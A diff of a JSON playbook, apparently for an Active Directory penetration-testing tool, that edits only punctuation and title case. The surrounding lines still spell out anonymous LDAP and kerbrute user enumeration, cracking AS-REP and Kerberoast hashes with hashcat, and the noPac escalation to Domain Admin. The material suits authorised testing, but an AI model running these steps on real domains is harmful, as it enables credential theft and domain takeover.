@@ -313,7 +313,7 @@
     {
      "tool": "sh",
      "run": "nxc ldap {{target}} -u '' -p '' --users | awk '{print $5}' | grep -vE '^-Username|^\\[|^SM_|^HealthMailbox|\\$$' | sort -u | tee {{lootdir}}/users.txt",
-     "note": "HANDOFF, boil the nxc table down to a tidy userlist (username is in column 5; confirm with head first, since nxc versions move columns around). It strips headers, machine accounts ($), and system mailboxes, then writes straight to loot/users.txt, the exact {{userlist}} obol fills into kerbrute, spraying, and roasting, so there is nothing to point by hand."
+     "note": "HANDOFF - boil the nxc table down to a tidy userlist (username is in column 5; confirm with head first, since nxc versions move columns around). It strips headers, machine accounts ($), and system mailboxes, then writes straight to loot/users.txt, the exact {{userlist}} obol fills into kerbrute, spraying, and roasting, so there is nothing to point by hand."
     }
    ]
   },
@@ -375,7 +375,7 @@
     {
      "tool": "sh",
      "run": "kerbrute userenum --dc {{target}} -d {{domain}} {{userlist}} -o {{scandir}}/kerb-valid.txt && grep VALID {{scandir}}/kerb-valid.txt | awk '{print $NF}' | cut -d@ -f1 | sort -u | tee {{lootdir}}/users.txt",
-     "note": "HANDOFF, turn kerbrute output into a clean loot/users.txt, the {{userlist}} every later AD move reads (nothing to point by hand). For the rpcclient route, feed enumdomusers through grep user: | cut -d[ -f2 | cut -d] -f1 | sort -u instead."
+     "note": "HANDOFF - turn kerbrute output into a clean loot/users.txt, the {{userlist}} every later AD move reads (nothing to point by hand). For the rpcclient route, feed enumdomusers through grep user: | cut -d[ -f2 | cut -d] -f1 | sort -u instead."
     }
    ]
   },
@@ -452,13 +452,13 @@
     {
      "tool": "sh",
      "run": "sort -u {{hashfile}} > asrep-clean.txt && wc -l asrep-clean.txt",
-     "note": "HANDOFF, remove duplicates before cracking, since repeats only waste GPU. Then run hashcat -m 18200 asrep-clean.txt {{wordlist}}."
+     "note": "HANDOFF - remove duplicates before cracking, since repeats only waste GPU. Then run hashcat -m 18200 asrep-clean.txt {{wordlist}}."
     }
    ]
   },
   {
    "id": "crack-asrep",
-   "title": "Crack AS-REP hashes",
+   "title": "Crack AS-REP Hashes",
    "hypothesis": "An AS-REP hash ($krb5asrep$) cracks offline without touching the target again. Service accounts marked DONT_REQUIRE_PREAUTH often use weak passwords; hand the roasted hashes to hashcat or john with a wordlist, and a cracked line turns into a genuine, validated credential you can log in with.",
    "tool": "hashcat",
    "tools": [
@@ -509,7 +509,7 @@
   },
   {
    "id": "crack-tgs",
-   "title": "Crack Kerberoast hashes",
+   "title": "Crack Kerberoast Hashes",
    "hypothesis": "A Kerberoast hash ($krb5tgs$) tied to a service account cracks offline. Service accounts frequently carry weak passwords that never expire; break one and you gain a validated credential, occasionally a highly privileged one.",
    "tool": "hashcat",
    "tools": [
@@ -723,7 +723,7 @@
     {
      "tool": "sh",
      "run": "grep -h '\\$krb5tgs\\$' {{hashfile}} | sort -u > tgs-clean.txt && wc -l tgs-clean.txt",
-     "note": "HANDOFF, strip duplicates from the roast file (nxc and impacket append on repeat runs), then run hashcat -m 13100 tgs-clean.txt {{wordlist}}. The sidebar hashfile should reference the source file."
+     "note": "HANDOFF - strip duplicates from the roast file (nxc and impacket append on repeat runs), then run hashcat -m 13100 tgs-clean.txt {{wordlist}}. The sidebar hashfile should reference the source file."
     }
    ]
   },
@@ -1319,7 +1319,7 @@
   },
   {
    "id": "cert-authenticate",
-   "title": "Authenticate with a certificate (PKINIT → NT hash)",
+   "title": "Authenticate with a Certificate (PKINIT → NT hash)",
    "hypothesis": "A certificate issued for a principal (whether from ADCS ESC abuse or shadow credentials) authenticates as that principal via PKINIT. certipy auth returns a TGT and, through UnPAC-the-hash, the account's NT hash. This is the step that converts certificate material into a validated credential you can genuinely log in with.",
    "tool": "certipy",
    "tools": [
@@ -2858,7 +2858,7 @@
   },
   {
    "id": "nopac",
-   "title": "noPac / sAMAccountName spoofing (CVE-2021-42278 + CVE-2021-42287)",
+   "title": "noPac / sAMAccountName Spoofing (CVE-2021-42278 + CVE-2021-42287)",
    "hypothesis": "On an unpatched DC, any authenticated user can rename a machine account to impersonate a DC and request a ticket as a privileged account, a straight line from a low-priv domain credential to Domain Admin / DCSync. Needs only valid creds and a vulnerable DC.",
    "tool": "noPac.py",
    "tools": [
